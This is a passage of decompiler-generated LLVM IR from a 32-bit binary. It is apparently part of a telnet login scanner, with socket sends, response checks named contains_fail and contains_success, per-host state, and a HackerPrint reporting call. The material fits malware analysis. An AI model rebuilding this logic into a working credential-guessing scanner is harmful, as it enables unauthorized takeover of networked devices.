  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d5aa = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d5aa = inttoptr i32 %v3_804d5aa to i8*
  store i8 1, i8* %v4_804d5aa, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d5b4:                             ; preds = %dec_label_pc_804d4e3
  %v4_804d5ca = load i32, i32* %v3_804d562, align 4
  store i32 %v4_804d5ca, i32* %eax.global-to-local, align 4
  %v1_804d5cd = add i32 %v0_804d572, 12
  %v2_804d5cd = inttoptr i32 %v1_804d5cd to i32*
  store i32 16384, i32* %v2_804d5cd, align 4
  %v1_804d5d2 = add i32 %v0_804d572, 8
  %v2_804d5d2 = inttoptr i32 %v1_804d5d2 to i32*
  store i32 2, i32* %v2_804d5d2, align 4
  %v1_804d5d4 = add i32 %v0_804d572, 4
  %v2_804d5d4 = inttoptr i32 %v1_804d5d4 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8058fe9.249 to i32), i32* %v2_804d5d4, align 4
  %v0_804d5d9 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d5d9 = inttoptr i32 %v0_804d572 to i32*
  store i32 %v0_804d5d9, i32* %v3_804d5d9, align 4
  %v4_804d5da = call i32 @__libc_send(i32 %v4_804d502, i32 %stack_var_-620.242, i32 %v2_804c8da, i32 %v6_804ca08)
  %v2_804d5e2 = icmp slt i32 %v4_804d5da, 0
  %v1_804d5e4 = icmp eq i1 %v2_804d5e2, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d5e4, label %dec_label_pc_804d621, label %dec_label_pc_804d5e6

dec_label_pc_804d5e6:                             ; preds = %dec_label_pc_804d5b4
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d617 = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d617 = inttoptr i32 %v3_804d617 to i8*
  store i8 1, i8* %v4_804d617, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d621:                             ; preds = %dec_label_pc_804d5b4
  store i8 6, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d641:                             ; preds = %dec_label_pc_804c9f2
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  %v1_804d659 = add i32 %v2_804c9b9, 24
  store i32 %v1_804d659, i32* %eax.global-to-local, align 4
  %v1_804d65c = inttoptr i32 %v1_804d659 to i32*
  %v2_804d65c = load i32, i32* %v1_804d65c, align 4
  store i32 %v2_804d65c, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d674 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d674 = load i32, i32* %v3_804d674, align 4
  store i32 %v4_804d674, i32* %eax.global-to-local, align 4
  %v0_804d677 = load i32, i32* @esp, align 4
  %v1_804d67a = add i32 %v0_804d677, -16
  %v2_804d67a = inttoptr i32 %v1_804d67a to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805d0c0.250 to i32), i32* %v2_804d67a, align 4
  %v1_804d67f = add i32 %v0_804d677, -20
  %v2_804d67f = inttoptr i32 %v1_804d67f to i32*
  store i32 1024, i32* %v2_804d67f, align 4
  %v0_804d684 = load i32, i32* @ebx, align 4
  %v2_804d684 = add i32 %v0_804d677, -24
  %v3_804d684 = inttoptr i32 %v2_804d684 to i32*
  store i32 %v0_804d684, i32* %v3_804d684, align 4
  %v5_804d685 = add i32 %v0_804d677, -28
  %v6_804d685 = inttoptr i32 %v5_804d685 to i32*
  store i32 10, i32* %v6_804d685, align 4
  %v0_804d688 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d688 = add i32 %v0_804d677, -32
  %v3_804d688 = inttoptr i32 %v2_804d688 to i32*
  store i32 %v0_804d688, i32* %v3_804d688, align 4
  %v1_804d689 = call i32 @read_until_response(i32 %v6_804ca08)
  store i32 %v1_804d689, i32* %eax.global-to-local, align 4
  %v0_804d68e = load i32, i32* @esp, align 4
  %v1_804d691 = icmp eq i32 %v1_804d689, 0
  br i1 %v1_804d691, label %dec_label_pc_804d8f4, label %dec_label_pc_804d699

dec_label_pc_804d699:                             ; preds = %dec_label_pc_804d641
  store i32 %storemerge43, i32* @ebx, align 4
  %v1_804d69f = add i32 %v0_804d68e, 16
  %v2_804d69f = inttoptr i32 %v1_804d69f to i32*
  store i32 0, i32* %v2_804d69f, align 4
  %v1_804d6a1 = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804d6a1 = call i32 @__GI_time(i32* %v1_804d6a1)
  store i32 %v2_804d6a1, i32* @esi, align 4
  %v0_804d6ae = load i32, i32* @ebx, align 4
  %v2_804d6be = mul i32 %v0_804d6ae, 28
  %v1_804d6c2 = add i32 %v2_804d6c0, %v2_804d6be
  %v2_804d6c5 = inttoptr i32 %v1_804d6c2 to i32*
  store i32 %v2_804d6a1, i32* %v2_804d6c5, align 4
  store i32 %v1_804c9a9, i32* @edx, align 4
  store i32 %v1_804d659, i32* %eax.global-to-local, align 4
  %v2_804d6e2 = load i32, i32* %v1_804d65c, align 4
  store i32 %v2_804d6e2, i32* %eax.global-to-local, align 4
  %v0_804d6e4 = load i32, i32* @esp, align 4
  %v2_804d6e7 = add i32 %v0_804d6e4, -16
  %v3_804d6e7 = inttoptr i32 %v2_804d6e7 to i32*
  store i32 %v2_804d6e2, i32* %v3_804d6e7, align 4
  %v0_804d6e8 = call i32 @contains_fail()
  %v0_804d6ed = load i32, i32* @esp, align 4
  %v1_804d6f0 = icmp eq i32 %v0_804d6e8, 0
  store i32 %v1_804c9a9, i32* @edx, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d6f0, label %dec_label_pc_804d714, label %dec_label_pc_804d6f4

dec_label_pc_804d6f4:                             ; preds = %dec_label_pc_804d699
  store i8 0, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d714:                             ; preds = %dec_label_pc_804d699
  store i32 %v1_804d659, i32* %eax.global-to-local, align 4
  %v2_804d72f = load i32, i32* %v1_804d65c, align 4
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  %v3_804d734 = inttoptr i32 %v0_804d6ed to i32*
  store i32 %v2_804d72f, i32* %v3_804d734, align 4
  %v0_804d735 = call i32 @contains_success()
  %v0_804d73a = load i32, i32* @esp, align 4
  %v1_804d73d = icmp eq i32 %v0_804d735, 0
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d73d, label %dec_label_pc_804d8b9, label %dec_label_pc_804d745

dec_label_pc_804d745:                             ; preds = %dec_label_pc_804d714
  %v3_804d75b = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d75b = inttoptr i32 %v3_804d75b to i8*
  %v5_804d75b = load i8, i8* %v4_804d75b, align 1
  %v10_804d75f = icmp eq i8 %v5_804d75b, 2
  %v1_804d761 = icmp eq i1 %v10_804d75f, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d761, label %dec_label_pc_804d783, label %dec_label_pc_804d763

dec_label_pc_804d763:                             ; preds = %dec_label_pc_804d745
  store i8 7, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d745
  %v3_804d799 = add i32 %v2_804cb3a, %v2_804c9b7
  %v4_804d799 = inttoptr i32 %v3_804d799 to i8*
  %v5_804d799 = load i8, i8* %v4_804d799, align 1
  %v6_804d799 = zext i8 %v5_804d799 to i32
  store i32 %v6_804d799, i32* %eax.global-to-local, align 4
  %v1_804d7a2 = mul nuw nsw i32 %v6_804d799, 4
  %v2_804d7a2 = add nuw nsw i32 %v1_804d7a2, 134598740
  %v3_804d7a2 = inttoptr i32 %v2_804d7a2 to i32*
  %v4_804d7a2 = load i32, i32* %v3_804d7a2, align 4
  store i32 %v4_804d7a2, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d7bf = add i32 %v2_804cb74, %v2_804c9b7
  %v4_804d7bf = inttoptr i32 %v3_804d7bf to i8*
  %v5_804d7bf = load i8, i8* %v4_804d7bf, align 2
  %v6_804d7bf = zext i8 %v5_804d7bf to i32
  store i32 %v6_804d7bf, i32* %eax.global-to-local, align 4
  %v1_804d7c8 = mul nuw nsw i32 %v6_804d7bf, 4
  %v2_804d7c8 = add nuw nsw i32 %v1_804d7c8, 134598728
  %v3_804d7c8 = inttoptr i32 %v2_804d7c8 to i32*
  %v4_804d7c8 = load i32, i32* %v3_804d7c8, align 4
  store i32 %v4_804d7c8, i32* @esi, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b9, i32* %eax.global-to-local, align 4
  %v3_804d7eb = inttoptr i32 %v0_804d73a to i32*
  store i32 %v2_804c9b9, i32* %v3_804d7eb, align 4
  %v0_804d7ec = call i32 @get_telstate_host()
  store i32 %v0_804d7ec, i32* %eax.global-to-local, align 4
  %v0_804d7f1 = load i32, i32* @esp, align 4
  %v0_804d7f4 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804d7f4, i32* %edx.global-to-local, align 4
  %v0_804d7fd = load i32, i32* @ebx, align 4
  %v3_804d7fd = inttoptr i32 %v0_804d7f1 to i32*
  store i32 %v0_804d7fd, i32* %v3_804d7fd, align 4
  %v0_804d7fe = load i32, i32* @esi, align 4
  %v2_804d7fe = add i32 %v0_804d7f1, -4
  %v3_804d7fe = inttoptr i32 %v2_804d7fe to i32*
  store i32 %v0_804d7fe, i32* %v3_804d7fe, align 4
  %v2_804d7ff = add i32 %v0_804d7f1, -8
  %v3_804d7ff = inttoptr i32 %v2_804d7ff to i32*
  store i32 %v0_804d7ec, i32* %v3_804d7ff, align 4
  %v1_804d800 = add i32 %v0_804d7f1, -12
  %v2_804d800 = inttoptr i32 %v1_804d800 to i32*
  store i32 ptrtoint (i32* @global_var_8058fec.251 to i32), i32* %v2_804d800, align 4
  %v0_804d805 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d805 = add i32 %v0_804d7f1, -16
  %v3_804d805 = inttoptr i32 %v2_804d805 to i32*
  store i32 %v0_804d805, i32* %v3_804d805, align 4
  %v2_804d806 = call i32 @HackerPrint(i32 %stack_var_-624.241, i32 %stack_var_-620.242)
  %v0_804d80b = load i32, i32* @esp, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v5_804d824 = load i8, i8* %v4_804d799, align 1
  %v6_804d824 = zext i8 %v5_804d824 to i32
  store i32 %v6_804d824, i32* %eax.global-to-local, align 4
  %v1_804d82d = mul nuw nsw i32 %v6_804d824, 4
  %v2_804d82d = add nuw nsw i32 %v1_804d82d, 134598740
  %v3_804d82d = inttoptr i32 %v2_804d82d to i32*
  %v4_804d82d = load i32, i32* %v3_804d82d, align 4
  store i32 %v4_804d82d, i32* @ebx, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v5_804d84a = load i8, i8* %v4_804d7bf, align 2
  %v6_804d84a = zext i8 %v5_804d84a to i32
  store i32 %v6_804d84a, i32* %eax.global-to-local, align 4
  %v1_804d853 = mul nuw nsw i32 %v6_804d84a, 4
  %v2_804d853 = add nuw nsw i32 %v1_804d853, 134598728
  %v3_804d853 = inttoptr i32 %v2_804d853 to i32*
  %v4_804d853 = load i32, i32* %v3_804d853, align 4
  store i32 %v4_804d853, i32* @esi, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b9, i32* %eax.global-to-local, align 4
  %v2_804d876 = add i32 %v0_804d80b, 16
  %v3_804d876 = inttoptr i32 %v2_804d876 to i32*
  store i32 %v2_804c9b9, i32* %v3_804d876, align 4
  %v0_804d877 = call i32 @get_telstate_host()
  store i32 %v0_804d877, i32* %eax.global-to-local, align 4
  %v0_804d87c = load i32, i32* @esp, align 4
  %v0_804d87f = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_804d87f, i32* %edx.global-to-local, align 4
  %v0_804d888 = load i32, i32* @ebx, align 4
  %v3_804d888 = inttoptr i32 %v0_804d87c to i32*
  store i32 %v0_804d888, i32* %v3_804d888, align 4
  %v0_804d889 = load i32, i32* @esi, align 4
  %v2_804d889 = add i32 %v0_804d87c, -4
  %v3_804d889 = inttoptr i32 %v2_804d889 to i32*
  store i32 %v0_804d889, i32* %v3_804d889, align 4
  %v2_804d88a = add i32 %v0_804d87c, -8
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v0_804d877, i32* %v3_804d88a, align 4
  %v1_804d88b = add i32 %v0_804d87c, -12
  %v2_804d88b = inttoptr i32 %v1_804d88b to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8059055.252 to i32), i32* %v2_804d88b, align 4
  %v0_804d890 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d890 = add i32 %v0_804d87c, -16
  %v3_804d890 = inttoptr i32 %v2_804d890 to i32*
  store i32 %v0_804d890, i32* %v3_804d890, align 4
  %v2_804d891 = call i32 @HackerPrint(i32 %stack_var_-624.241, i32 %stack_var_-620.242)
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804ca08, align 4
  br label %dec_label_pc_804dac9

dec_label_pc_804d8b9:                             ; preds = %dec_label_pc_804d714
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d8ea = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d8ea = inttoptr i32 %v3_804d8ea to i8*
  store i8 1, i8* %v4_804d8ea, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d8f4:                             ; preds = %dec_label_pc_804d641
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v2_804d90f = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804d90f, i32* %eax.global-to-local, align 4
  %v1_804d911 = add i32 %v2_804d90f, 7
  store i32 %v1_804d911, i32* @ebx, align 4
  %v1_804d917 = add i32 %v0_804d68e, 16
  %v2_804d917 = inttoptr i32 %v1_804d917 to i32*
  store i32 0, i32* %v2_804d917, align 4
  %v1_804d919 = inttoptr i32 %stack_var_-624.241 to i32*
  %v2_804d919 = call i32 @__GI_time(i32* %v1_804d919)
  store i32 %v2_804d919, i32* %eax.global-to-local, align 4
  %v0_804d921 = load i32, i32* @ebx, align 4
  %v7_804d921 = icmp ult i32 %v0_804d921, %v2_804d919
  %v1_804d923 = icmp eq i1 %v7_804d921, false
  br i1 %v1_804d923, label %dec_label_pc_804dac9, label %dec_label_pc_804d929

dec_label_pc_804d929:                             ; preds = %dec_label_pc_804d8f4
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d95a = add i32 %v2_804c963, %v2_804c9b7
  %v4_804d95a = inttoptr i32 %v3_804d95a to i8*
  store i8 1, i8* %v4_804d95a, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804d964:                             ; preds = %dec_label_pc_804c9f2
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804d967 = load i32, i32* @esp, align 4
  %v1_804d96a = add i32 %v0_804d967, -16
  %v2_804d96a = inttoptr i32 %v1_804d96a to i32*
  store i32 0, i32* %v2_804d96a, align 4
  %v1_804d96c = inttoptr i32 %v6_804ca08 to i32*
  %v2_804d96c = call i32 @__GI_time(i32* %v1_804d96c)
  %v0_804d979 = load i32, i32* @ebx, align 4
  %v1_804d97b = mul i32 %v0_804d979, 4
  store i32 %v1_804d97b, i32* %edx.global-to-local, align 4
  %v2_804d989 = mul i32 %v0_804d979, 28
  %v2_804d98b = add i32 %v2_804d989, %v2_804c8da
  %v1_804d98d = add i32 %v2_804d98b, 16
  %v2_804d990 = inttoptr i32 %v1_804d98d to i32*
  store i32 %v2_804d96c, i32* %v2_804d990, align 4
  %v0_804d992 = load i32, i32* bitcast ([318 x i8]** @global_var_805d060.254 to i32*), align 32
  %v5_804d99c = inttoptr i32 %v0_804d992 to i8*
  %v1_804d9a2 = and i32 %v0_804d992, -256
  store i32 %v1_804d9a2, i32* %eax.global-to-local, align 4
  store i32 %v0_804d992, i32* @edi, align 4
  %v3_804d9ab = call i32 @_strlen(i8* %v5_804d99c)
  store i32 %v3_804d9ab, i32* @ebx, align 4
  %v0_804d9b4 = load i32, i32* bitcast ([318 x i8]** @global_var_805d060.254 to i32*), align 32
  store i32 %v0_804d9b4, i32* @esi, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804d9d0 = inttoptr i32 %v2_804c9b9 to i32*
  %v4_804d9d0 = load i32, i32* %v3_804d9d0, align 4
  store i32 %v4_804d9d0, i32* %eax.global-to-local, align 4
  %v0_804d9d3 = load i32, i32* @esp, align 4
  %v1_804d9d3 = add i32 %v0_804d9d3, -4
  %v2_804d9d3 = inttoptr i32 %v1_804d9d3 to i32*
  store i32 16384, i32* %v2_804d9d3, align 4
  %v0_804d9d8 = load i32, i32* @ebx, align 4
  %v2_804d9d8 = add i32 %v0_804d9d3, -8
  %v3_804d9d8 = inttoptr i32 %v2_804d9d8 to i32*
  store i32 %v0_804d9d8, i32* %v3_804d9d8, align 4
  %v0_804d9d9 = load i32, i32* @esi, align 4
  %v2_804d9d9 = add i32 %v0_804d9d3, -12
  %v3_804d9d9 = inttoptr i32 %v2_804d9d9 to i32*
  store i32 %v0_804d9d9, i32* %v3_804d9d9, align 4
  %v0_804d9da = load i32, i32* %eax.global-to-local, align 4
  %v2_804d9da = add i32 %v0_804d9d3, -16
  %v3_804d9da = inttoptr i32 %v2_804d9da to i32*
  store i32 %v0_804d9da, i32* %v3_804d9da, align 4
  %v5_804d9db = call i32 @__libc_send(i32 %v0_804d992, i32 %stack_var_-624.241, i32 %stack_var_-620.242, i32 %v2_804c8da)
  %v0_804d9e0 = load i32, i32* @esp, align 4
  %v2_804d9e3 = icmp slt i32 %v5_804d9db, 0
  %v1_804d9e5 = icmp eq i1 %v2_804d9e3, false
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  br i1 %v1_804d9e5, label %dec_label_pc_804da47, label %dec_label_pc_804d9e7

dec_label_pc_804d9e7:                             ; preds = %dec_label_pc_804d964
  %v4_804d9fd = load i32, i32* %v3_804d9d0, align 4
  store i32 %v4_804d9fd, i32* %eax.global-to-local, align 4
  %v3_804da03 = inttoptr i32 %v0_804d9e0 to i32*
  store i32 %v4_804d9fd, i32* %v3_804da03, align 4
  %v2_804da04 = call i32 @sclose(i32 %v0_804d992)
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  %v3_804da3d = add i32 %v2_804c963, %v2_804c9b7
  %v4_804da3d = inttoptr i32 %v3_804da3d to i8*
  store i8 1, i8* %v4_804da3d, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804da47:                             ; preds = %dec_label_pc_804d964
  %v3_804da5d = add i32 %v2_804c963, %v2_804c9b7
  %v4_804da5d = inttoptr i32 %v3_804da5d to i8*
  store i8 3, i8* %v4_804da5d, align 1
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9bb, i32* %eax.global-to-local, align 4
  %v2_804da7d = load i32, i32* %v1_804c9be, align 4
  store i32 %v2_804da7d, i32* %eax.global-to-local, align 4
  %v1_804da7f = add i32 %v2_804da7d, 60
  store i32 %v1_804da7f, i32* @ebx, align 4
  %v0_804da82 = load i32, i32* @esp, align 4
  %v1_804da85 = add i32 %v0_804da82, -16
  %v2_804da85 = inttoptr i32 %v1_804da85 to i32*
  store i32 0, i32* %v2_804da85, align 4
  %tmp39 = inttoptr i32 %v0_804d992 to i32*
  %v3_804da87 = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804da87, i32* %eax.global-to-local, align 4
  %v0_804da8f = load i32, i32* @ebx, align 4
  %v7_804da8f = icmp ult i32 %v0_804da8f, %v3_804da87
  %v1_804da91 = icmp eq i1 %v7_804da8f, false
  br i1 %v1_804da91, label %dec_label_pc_804dac9, label %dec_label_pc_804da93

dec_label_pc_804da93:                             ; preds = %dec_label_pc_804da47
  store i8 0, i8* %v4_804ca08, align 4
  store i32 %v1_804c9a9, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9b7, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804da5d, align 1
  br label %dec_label_pc_804dac9

dec_label_pc_804dac9:                             ; preds = %dec_label_pc_804c9f2, %dec_label_pc_804da47, %dec_label_pc_804d8f4, %dec_label_pc_804d473, %dec_label_pc_804d1e4, %dec_label_pc_804d08e, %dec_label_pc_804cc12, %dec_label_pc_804d9e7, %dec_label_pc_804d929, %dec_label_pc_804d8b9, %dec_label_pc_804d783, %dec_label_pc_804d763, %dec_label_pc_804d6f4, %dec_label_pc_804d621, %dec_label_pc_804d5e6, %dec_label_pc_804d579, %dec_label_pc_804d4a8, %dec_label_pc_804d453, %dec_label_pc_804d433, %dec_label_pc_804d392, %dec_label_pc_804d357, %dec_label_pc_804d2ea, %dec_label_pc_804d219, %dec_label_pc_804d1c4, %dec_label_pc_804d1a4, %dec_label_pc_804d0c3, %dec_label_pc_804d02e, %dec_label_pc_804cf3d, %dec_label_pc_804cedd, %dec_label_pc_804cd92, %dec_label_pc_804cd4d, %dec_label_pc_804cbf2, %dec_label_pc_804cbb4, %dec_label_pc_804da93
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.241, %dec_label_pc_804c9f2 ], [ %stack_var_-624.241, %dec_label_pc_804da47 ], [ %stack_var_-624.241, %dec_label_pc_804da93 ], [ %stack_var_-624.241, %dec_label_pc_804d9e7 ], [ %stack_var_-624.241, %dec_label_pc_804d8f4 ], [ %stack_var_-624.241, %dec_label_pc_804d929 ], [ %stack_var_-624.241, %dec_label_pc_804d8b9 ], [ %stack_var_-624.241, %dec_label_pc_804d783 ], [ %stack_var_-624.241, %dec_label_pc_804d763 ], [ %stack_var_-624.241, %dec_label_pc_804d6f4 ], [ %v4_804d502, %dec_label_pc_804d621 ], [ %v4_804d502, %dec_label_pc_804d5e6 ], [ %v4_804d502, %dec_label_pc_804d579 ], [ %stack_var_-624.241, %dec_label_pc_804d473 ], [ %stack_var_-624.241, %dec_label_pc_804d4a8 ], [ %stack_var_-624.241, %dec_label_pc_804d453 ], [ %stack_var_-624.241, %dec_label_pc_804d433 ], [ %stack_var_-624.241, %dec_label_pc_804d392 ], [ %stack_var_-624.241, %dec_label_pc_804d357 ], [ %stack_var_-624.241, %dec_label_pc_804d2ea ], [ %stack_var_-624.241, %dec_label_pc_804d1e4 ], [ %stack_var_-624.241, %dec_label_pc_804d219 ], [ %stack_var_-624.241, %dec_label_pc_804d1c4 ], [ %stack_var_-624.241, %dec_label_pc_804d1a4 ], [ %stack_var_-624.241, %dec_label_pc_804d08e ], [ %stack_var_-624.241, %dec_label_pc_804d0c3 ], [ %stack_var_-624.241, %dec_label_pc_804d02e ], [ %stack_var_-624.241, %dec_label_pc_804cf3d ], [ %stack_var_-624.241, %dec_label_pc_804cedd ], [ %stack_var_-624.241, %dec_label_pc_804cc12 ], [ %stack_var_-624.241, %dec_label_pc_804cd92 ], [ %stack_var_-624.241, %dec_label_pc_804cd4d ], [ %stack_var_-624.241, %dec_label_pc_804cbf2 ], [ %stack_var_-624.241, %dec_label_pc_804cbb4 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.242, %dec_label_pc_804c9f2 ], [ %stack_var_-620.242, %dec_label_pc_804da47 ], [ %stack_var_-620.242, %dec_label_pc_804da93 ], [ %stack_var_-620.242, %dec_label_pc_804d9e7 ], [ %stack_var_-620.242, %dec_label_pc_804d8f4 ], [ %stack_var_-620.242, %dec_label_pc_804d929 ], [ %stack_var_-620.242, %dec_label_pc_804d8b9 ], [ %stack_var_-620.242, %dec_label_pc_804d783 ], [ %stack_var_-620.242, %dec_label_pc_804d763 ], [ %stack_var_-620.242, %dec_label_pc_804d6f4 ], [ %stack_var_-620.242, %dec_label_pc_804d621 ], [ %stack_var_-620.242, %dec_label_pc_804d5e6 ], [ %stack_var_-620.242, %dec_label_pc_804d579 ], [ %stack_var_-620.242, %dec_label_pc_804d473 ], [ %stack_var_-620.242, %dec_label_pc_804d4a8 ], [ %stack_var_-620.242, %dec_label_pc_804d453 ], [ %stack_var_-620.242, %dec_label_pc_804d433 ], [ %v4_804d273, %dec_label_pc_804d392 ], [ %v4_804d273, %dec_label_pc_804d357 ], [ %v4_804d273, %dec_label_pc_804d2ea ], [ %stack_var_-620.242, %dec_label_pc_804d1e4 ], [ %stack_var_-620.242, %dec_label_pc_804d219 ], [ %stack_var_-620.242, %dec_label_pc_804d1c4 ], [ %stack_var_-620.242, %dec_label_pc_804d1a4 ], [ %stack_var_-620.242, %dec_label_pc_804d08e ], [ %stack_var_-620.242, %dec_label_pc_804d0c3 ], [ %stack_var_-620.242, %dec_label_pc_804d02e ], [ %stack_var_-620.242, %dec_label_pc_804cf3d ], [ %stack_var_-620.242, %dec_label_pc_804cedd ], [ %stack_var_-620.242, %dec_label_pc_804cc12 ], [ %stack_var_-620.242, %dec_label_pc_804cd92 ], [ %stack_var_-620.242, %dec_label_pc_804cd4d ], [ %stack_var_-620.242, %dec_label_pc_804cbf2 ], [ %stack_var_-620.242, %dec_label_pc_804cbb4 ]
  %v4_804dac9 = add nuw nsw i32 %storemerge43, 1
  %v15_804dacf = icmp eq i32 %v4_804dac9, 1000
  br i1 %v15_804dacf, label %dec_label_pc_804c997, label %dec_label_pc_804c9a3

; uselistorder directives
  uselistorder i32 %v4_804dac9, { 1, 0, 2 }
  uselistorder i32 %v0_804d572, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804d2e3, { 3, 0, 1, 2 }
  uselistorder i32 %v13_804cf68, { 1, 0 }
  uselistorder i32 %v0_804cf63, { 2, 0, 1 }
  uselistorder i32 %v0_804ce78, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804ce73, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804ce23, { 1, 0 }
  uselistorder i32 %v2_804ce07, { 1, 0 }
  uselistorder i32 %v0_804cd0b, { 2, 0, 1 }
  uselistorder i32 %v12_804cce3, { 1, 0 }
  uselistorder i32 %v0_804ccde, { 2, 0, 1 }
  uselistorder i32 %v0_804cc25, { 2, 0, 1 }
  uselistorder i32 %v2_804ca72, { 1, 0 }
  uselistorder i32 %v6_804ca08, { 9, 8, 6, 7, 5, 3, 4, 2, 1, 11, 10, 12, 0 }
  uselistorder i8* %v4_804ca08, { 22, 23, 17, 18, 19, 20, 21, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804c9be, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804c9bb, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804c9b9, { 22, 16, 17, 18, 19, 20, 21, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 23 }
  uselistorder i32 %v2_804c9b7, { 24, 0, 1, 23, 25, 26, 2, 35, 3, 32, 27, 28, 29, 5, 30, 4, 31, 6, 33, 34, 36, 7, 38, 39, 8, 37, 40, 41, 42, 9, 43, 10, 45, 44, 46, 11, 48, 49, 12, 47, 50, 51, 52, 13, 53, 14, 55, 54, 56, 15, 63, 64, 16, 62, 65, 58, 59, 17, 57, 60, 61, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 78, 18, 79, 80, 20, 81, 83, 21, 82, 22 }
  uselistorder i32 %v1_804c9a9, { 1, 2, 0, 3, 4, 16, 17, 12, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 40, 39, 41, 42, 43, 51, 52, 50, 53, 45, 46, 47, 44, 48, 49, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 %stack_var_-624.241, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 9, 7, 6, 4, 3, 2, 0, 1, 5, 11, 10, 8 }
